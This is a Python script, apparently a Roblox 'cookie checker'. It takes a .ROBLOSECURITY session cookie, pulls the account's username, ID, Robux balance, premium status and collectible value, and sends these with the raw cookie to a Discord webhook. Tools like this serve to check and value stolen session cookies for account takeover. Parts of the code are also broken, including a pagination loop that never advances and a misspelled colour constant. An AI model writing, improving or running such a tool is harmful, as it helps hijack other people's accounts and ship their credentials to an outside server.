from distutils.command.build import build
import os
import time
import base64
class main(object):
    def __init__(self):
        try:
            import requests
            import colorama
            from colorama import Fore
            from dhooks import Webhook, Embed
            colorama.init()
        except:
            print("Packages are not installed!")
            time.sleep(0.5)
            user_install = input("Want to install the packages? y/n ")
            if user_install == 'n':
                print(Fore.RED + "Closing in a few seconds")
                time.sleep(5)
                os._exit(0)
            elif user_install == 'y':
                try:
                    os.system('pip install colorama requests')
                    print(Fore.GREEN + "Install now hit enter to try again")
                    input("")
                except:
                    print("Couldn't fix Hit enter to close")
        print(Fore.RED + "Cookie Checker By Geek")
        time.sleep(.5)
        cookie = input("Enter cookie: ")
        webhook_thing = input("Enter webhook info will be sent to: ")
        
        r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY" : cookie}).json()
        print(Fore.GREEN + "Cookie is authenticated and valid!")
        try:
            userid = (str(r["UserID"]))
            #print(Fore.YELLOW + "Account User Id: " + userid)
        except:
            print(Fore.RED + "Couldn't Get User Id")
        try:
            username = (str(r["UserName"]))
            #print(Fore.YELLOW + "Username: " + username)
        except:
            print(Fore.RED + "Couldn't Get UserName")
        try:
            balance = (str(r["RobuxBalance"]))
            #print(Fore.GREEN + balance)
        except:
            print(Fore.RED + "Counldn't Get Balance")
        try:
            pfp = (str(r["ThumbnailUrl"]))
            #print(Fore.BLUE + pfp)
        except:
            print(Fore.REd + "Counldn't Get pfp")
        try:
            builder = str(r['IsAnyBuildersClubMember'])
            #print(Fore.YELLOW + builder)
        except:
            print(Fore.RED + "Counldn't Get Builder")
        try:
            premium = str(r['IsPremium'])
            #print(Fore.YELLOW + premium)
        except:
            print(Fore.RED + "Counldn't Get Premium")
        #yoinked this rap snippet
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
        while rap_dict['nextPageCursor'] != None:
            rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
        rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])

        embed1 = Embed(
            color=0xeb4034,
            timestamp='now'
        )
        
        embed1.add_field(name="Usernae🙍", value="```" + username + "```")
        embed1.set_thumbnail(pfp)
        embed1.add_field(name="UserID🆔", value="```" + userid + "```")
        embed1.add_field(name='Balance💳', value="```" + balance + "```")
        embed1.add_field(name='Builder🧾', value="```" + builder + "```")
        embed1.add_field(name='Premium⭐', value="```" + premium + "```\n")
        embed1.add_field(name='Rap💠', value="```" + (str(rap) + "```"))
        embed1.add_field(name='Cookie🍪', value="```" + cookie + "```")
        embed1.set_footer(text="Made by Geek#7216")
        try:
            webhook = Webhook(webhook_thing)
            webhook.send(embed=embed1)
            print(Fore.GREEN + "INFORMATION HAS BEEN SENT TO WEBHOOK!")
        except:
            print(Fore.RED + "Discord webhook is incorrect! double check it is valid!")
            print(Fore.RED + "Closing in 5 seconds")
            time.sleep(5)
            os._exit(0)
if __name__=="__main__":
    main()


